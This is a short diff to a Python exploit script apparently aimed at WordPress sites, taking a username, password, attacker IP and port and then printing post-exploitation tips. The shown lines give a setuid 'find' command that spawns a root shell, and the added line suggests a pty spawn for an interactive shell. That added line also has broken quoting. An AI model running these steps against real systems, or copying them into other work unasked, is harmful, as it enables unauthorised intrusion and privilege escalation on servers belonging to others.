@@ -177,6 +177,7 @@ if __name__ == "__main__":
     print(YELLOW + "\n[*] Starting exploitation..." + RESET)
     if exploit_wordpress(username, password, attacker_ip, attacker_port):
         print(GREEN + '[+] Use this command to get root access "find . -exec /bin/sh -p \\; -quit"' + RESET)
+        print(GREEN + '[+] For interactive shell use this " python -c 'import pty; pty.spawn("/bin/bash")' "' + RESET)
         print(GREEN + "[+] Exploitation completed successfully!" + RESET)
     else:
         print(RED + "[-] Exploitation failed" + RESET)
